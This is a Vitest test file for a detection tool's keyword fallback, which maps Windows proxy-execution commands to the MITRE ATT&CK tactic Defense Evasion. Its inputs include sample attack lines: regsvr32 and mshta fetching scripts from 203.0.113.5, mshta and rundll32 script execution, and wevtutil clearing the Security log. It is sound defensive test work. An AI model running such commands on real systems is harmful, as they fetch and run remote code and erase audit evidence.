import { describe, it, expect } from "vitest";
import { tacticForTechniques } from "../../src/analysis/mitreTactics.js";

// An event with no ATT&CK id falls back to keywords in its description. `rundll32`, `mshta` and
// `regsvr32` were on that list by name, so every `regsvr32 /s` an installer ran (240 events in one
// case) was labelled Defense Evasion, and phases built from those events carried the label. The
// names now count only in the forms that fetch or run a script.

const tactic = (description: string) => tacticForTechniques([], description);

describe("keyword tactic fallback for proxy-execution binaries", () => {
  it("does not label an ordinary launch as Defense Evasion", () => {
    expect(
      tactic(
        'Sysmon Process create (EID 1) - Image=C:\\Windows\\System32\\regsvr32.exe - CommandLine=regsvr32.exe /s "C:\\Program Files\\Vendor\\Plugin.dll"',
      ),
    ).toBeUndefined();
    expect(
      tactic(
        "Sysmon Process create (EID 1) - Image=C:\\Windows\\System32\\rundll32.exe - CommandLine=rundll32.exe shell32.dll,Control_RunDLL",
      ),
    ).toBeUndefined();
    expect(
      tactic(
        "Sysmon Process create (EID 1) - Image=C:\\Windows\\System32\\mshta.exe - CommandLine=mshta.exe C:\\Help\\page.hta",
      ),
    ).toBeUndefined();
  });

  it("labels the script-fetching forms as Defense Evasion", () => {
    expect(tactic("regsvr32 /s /n /u /i:http://203.0.113.5/a.sct scrobj.dll")).toBe("Defense Evasion");
    expect(tactic("regsvr32.exe scrobj.dll")).toBe("Defense Evasion");
    expect(tactic("mshta http://203.0.113.5/payload.hta")).toBe("Defense Evasion");
    expect(tactic('mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""calc""")')).toBe(
      "Defense Evasion",
    );
    expect(tactic('rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)')).toBe(
      "Defense Evasion",
    );
  });

  it("keeps the other Defense Evasion keywords", () => {
    expect(tactic("Windows Defender tampering detected")).toBe("Defense Evasion");
    expect(tactic("wevtutil cl Security")).toBe("Defense Evasion");
    expect(tactic("obfuscated PowerShell")).toBe("Defense Evasion");
  });

  it("still lets an ATT&CK id decide first", () => {
    expect(tacticForTechniques(["T1053.005"], "regsvr32 /s plugin.dll")).toBe("Persistence");
  });
});
